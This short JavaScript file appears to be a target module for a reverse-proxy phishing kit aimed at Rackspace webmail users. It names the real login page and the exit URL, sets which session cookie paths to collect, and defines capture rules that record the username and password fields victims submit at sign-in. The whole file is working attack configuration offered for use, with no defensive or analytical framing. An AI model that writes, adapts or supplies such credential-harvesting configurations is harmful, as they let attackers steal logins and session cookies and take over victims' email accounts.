/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const fs = require('fs')
const superagent = require('superagent');


// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Important Defaults */

const configExport = {
    SCHEME: 'rackspace',

    CURRENT_DOMAIN: 'apps.rackspace.com',

    START_PATH: '/wmidentity/Account/Login',

    COOKIE_PATH: ['/a/webmail.php.*'],

    EXIT_TRIGGER_PATH: [],

    EXIT_URL: 'https://rackspace.com/a/webmail.php',


    EXTERNAL_FILTERS:[],


    PRE_HANDLERS:[],
   
    PROXY_REQUEST: 'DEFAULT',
    PROXY_RESPONSE: 'DEFAULT',
    DEFAULT_PRE_HANDLER: 'DEFAULT',

    CAPTURES: {
        rackspaceUser: {
            method: 'POST',
            params: ['username'],
            urls: '',
            hosts: ['apps.rackspace.com']
        },
        rackspacePassword: {
            method: 'POST',
            params: ['password'],
            urls: '',
            hosts: ['apps.rackspace.com']
        },
       
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport

